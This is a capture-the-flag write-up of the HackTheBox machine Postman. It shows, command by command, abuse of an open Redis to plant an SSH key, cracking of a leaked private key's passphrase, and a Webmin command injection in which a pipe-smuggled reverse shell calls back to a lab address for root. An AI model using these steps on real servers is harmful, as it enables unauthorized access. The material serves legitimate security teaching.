---
layout: post
title: "The Mail Slot That Wrote Your Key"
subtitle: "HTB Postman, where an open Redis turns a cache into a file printer, a reused password unlocks the man it was hiding, and a help panel runs your command as root"
date: 2020-03-21 12:00:00 +0000
description: "An open Redis writes your SSH key to disk, a cracked password walks you to the user it was locking out, and a Webmin panel hands you root one pipe at a time."
image: /assets/og/the-mail-slot-that-wrote-your-key.png
tags: [hackthebox, writeup]
---

Postman is a sorting office that left the mail slot unlocked, and the whole box runs on things that were never supposed to write to disk doing exactly that. An open Redis instance, meant to hold cache in memory, gets talked into printing a file of your choosing into a folder SSH trusts. A leftover private key, world-readable in a place nobody cleaned up, gives up its passphrase to a wordlist. That passphrase turns out to be a man's login password, which turns out to be his Webmin password, which turns out to be a key that fits a panel running as root. Nobody forces a single door here. Every step is a service or a person handing you a privilege they meant to keep, because they trusted an address, a habit, or a costume.

```
        P O S T M A N
        =============
        redis :6379   "i only hold things in memory"
                      config set dir  ~/.ssh
                      config set dbfilename  authorized_keys
                      save  →  the cache prints itself to disk
                        |
                        v
        a key lands in a folder sshd reads.
        you walk in. a reused password walks you up.
        a help panel runs your command wearing root's coat.
                                            鍵
```

## 0x01 · the loading dock

`nmap -sC -sV` against the box comes back with four open doors, and two of them are the kind you do not see on a hardened host.

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp    open  http    Apache httpd 2.4.29 (Ubuntu)
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
```

The web page on 80 is set dressing. The interesting pair is 6379 and 10000. Port 6379 is Redis, an in-memory data store that is supposed to live behind a firewall, talking only to the app that owns it, never to the open internet. Port 10000 is Webmin, a browser-based admin panel that runs as root because its entire job is to administer the box. Two services that both expect to be trusted, both exposed. Hold that. The box is built out of trust nobody revoked.

## 0x02 · the cache that printed a key

Redis 4.0.9 answers on 6379 with no password at all. You connect with `redis-cli -h 10.10.10.160`, type `info`, and it just talks. That alone is the bug. Everything after it is leverage.

Here is the move, and it is genuinely clever. Redis can be told to save its in-memory database to disk as a file, and you get to choose both the folder and the filename. So you point the folder at the redis user's `.ssh` directory and name the file `authorized_keys`, which is the exact file SSH reads to decide who may log in without a password. Then you stuff one key into Redis, the public half of a pair you generated, and tell it to save.

```
$ ssh-keygen -f iceberg -N ''
$ redis-cli -h 10.10.10.160
10.10.10.160:6379> config set dir /var/lib/redis/.ssh
OK
10.10.10.160:6379> set payload "\n\n$(cat iceberg.pub)\n\n"
OK
10.10.10.160:6379> config set dbfilename authorized_keys
OK
10.10.10.160:6379> save
OK
```

Picture a photocopier that, instead of only copying onto paper, will print whatever is loaded in its tray onto any door in the building you name. You load your name badge into the tray, point it at the staff entrance, and hit print. Now your badge is painted on the door, and the scanner there reads it as genuine.

The newlines around the key are the trick inside the trick. The file Redis writes is not a clean text file. It is a binary database dump with your key buried in the middle of it. But SSH reads `authorized_keys` line by line, and any line it cannot parse as a key it simply skips. Think of it like a bouncer reading a smudged guest list. Most lines are unreadable scribble and he ignores them, but one line is a clean, valid name, so he waves that guest in. The newlines guarantee your key sits alone on its own clean line, away from the binary garbage. Save the matching private key locally and walk in.

```
$ ssh -i iceberg redis@10.10.10.160
redis@Postman:~$ id
uid=107(redis) gid=114(redis) groups=114(redis)
```

A worthwhile footnote on the obvious shortcut. There is a Metasploit module, `exploit/linux/redis/redis_unauth_exec`, that automates Redis abuse by loading a malicious module. It fails here, because whoever set this box up disabled the `MODULE` command with `rename-command MODULE ""`. The lazy button is wired to nothing. The hand-built `authorized_keys` route still works, because they locked one window and left the loading dock wide open. Partial hardening is its own lesson.

## 0x03 · the key someone forgot to shred

`redis` is a service account that owns almost nothing. So you look around, and in `/opt` there is a file that does not belong there, `id_rsa.bak`, and it is readable by everyone on the box.

```
redis@Postman:/$ ls -l /opt/id_rsa.bak
-rwxr-xr-x 1 Matt Matt 1743 Aug 26  2019 /opt/id_rsa.bak
```

It is an SSH private key, and it is encrypted. The header says `Proc-Type: 4,ENCRYPTED` with a `DES-EDE3-CBC` cipher, which means the key itself is locked behind a passphrase. A locked key is not a way in. It is a puzzle with the answer attached, because a passphrase a human chose is a passphrase a wordlist might already contain.

So you do the standard two-step. Convert the key into a format John the Ripper can chew on, then throw the famous `rockyou.txt` list at it.

```
$ ssh2john id_rsa.bak > matt.hash
$ john --wordlist=/usr/share/wordlists/rockyou.txt matt.hash
computer2008     (id_rsa.bak)
```

Picture a diary with a cheap combination lock, tossed in a drawer that anyone can open. The lock looks like security, but the combination is the owner's birthday, and you have a book of every birthday. `computer2008` is the passphrase. The key belongs to a user named Matt, whose name is right there in the file's ownership.

The obvious next move is to SSH in as Matt with the decrypted key, and the box says no. `sshd_config` carries a `DenyUsers Matt` line, so Matt cannot log in over SSH at all. A door bolted from the inside. But you are already standing inside the house as `redis`, and from inside you do not need the SSH door. You need a password, and people who lock a key with a passphrase tend to reuse that passphrase as their actual login. Same word on the diary and the front door.

```
redis@Postman:/$ su Matt
Password: computer2008
Matt@Postman:/$ id
uid=1000(Matt) gid=1000(Matt) groups=1000(Matt)
Matt@Postman:/$ cat /home/Matt/user.txt
████████████████████████████████
```

The `DenyUsers` rule was real protection, and it bought nothing, because it only guarded one road into the house. The passphrase the box tried so hard to keep behind DES turned out to be the same word guarding the man himself.

## 0x04 · the panel wearing root's coat

Matt is a normal user. The path up is port 10000, the Webmin panel, MiniServ 1.910. Webmin authenticates against the system's own accounts, so the password you just used for `su` logs you straight into the admin panel in a browser. Same word, third lock.

Webmin 1.910 carries CVE-2019-12840. The flaw lives in the Package Updates module, the part of the panel that installs and updates software. Updating packages is inherently a root job, so that CGI script runs as root by design. The bug is that it builds a shell command out of values you submit and never checks them for shell metacharacters. You hand it a package name with a pipe and a command tacked on, and the part after the pipe runs as root.

Think of it like a hardware-store clerk who is allowed into the locked back room to fetch whatever you write on an order slip. The slip is supposed to say a product name. You write "paint, and also unlock the safe," and the clerk, reading literally, fetches the paint and opens the safe, because nobody told him an order slip could contain an instruction. Webmin reads your package field literally and runs the second half.

The request targets `update.cgi` with two `u` parameters, the second smuggling the payload behind a pipe.

```
POST /package-updates/update.cgi HTTP/1.1
Cookie: sid=<authenticated Matt session>
Content-Type: application/x-www-form-urlencoded

u=acl/apt&u=| [ bash reverse shell over /dev/tcp back to 10.10.14.4 on 443 ] &ok_top=Update+Selected+Packages
```

Start a listener, send the request, and the panel hands you a shell wearing root's coat.

```
$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.160]
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
████████████████████████████████
```

## 0x05 · the honest caveat

It is easy to read Postman as three unrelated bugs stapled together. Look again and it is one mistake told three ways, the mistake of trusting an address instead of checking a fact. Redis trusted that anyone who could reach port 6379 belonged there, so it printed a file wherever it was told. SSH trusted that any well-formed line in `authorized_keys` was put there by the owner. Webmin trusted that any package name from an authenticated user was a real package name and not a command in disguise. None of those services was broken in the sense of crashing or corrupting memory. Each one did precisely what it was built to do, for a stranger it should never have served.

And the quiet hinge that turns three separate trusts into one clean chain is the password. `computer2008` locked an SSH key, unlocked a user, and unlocked an admin panel that runs as root. One word, reused across a passphrase and two logins, is what welds the steps together. The Redis bug got you a foothold and the Webmin bug got you root, but credential reuse is what carried you across the gap between them. You can patch Redis with a config line and patch Webmin with an upgrade. You cannot patch the human who picks one word and uses it for everything, and on this box that human is the real vulnerability. The CVEs get fixed on a Tuesday. The habit ships green.

## 0x06 · outro

```
the cache printed a key onto a door it did not own.
the door opened because one line in the list was clean.
the locked key gave up a word, and the word was the man.
the same word walked into a panel that runs as root.

one mistake, told three times: trusting the address on the envelope
instead of checking what was inside.

lock the cache. shred the key. never reuse the word. wear black.

                                                            EOF
```

---

*HTB: Postman, retired 14 Mar 2020. An easy Linux box that is really a lecture on misplaced trust, where an open Redis prints your SSH key, a forgotten passphrase becomes a man's password, and a help panel runs your command as root. The mail slot is still unlocked in a lab and nowhere you don't own.*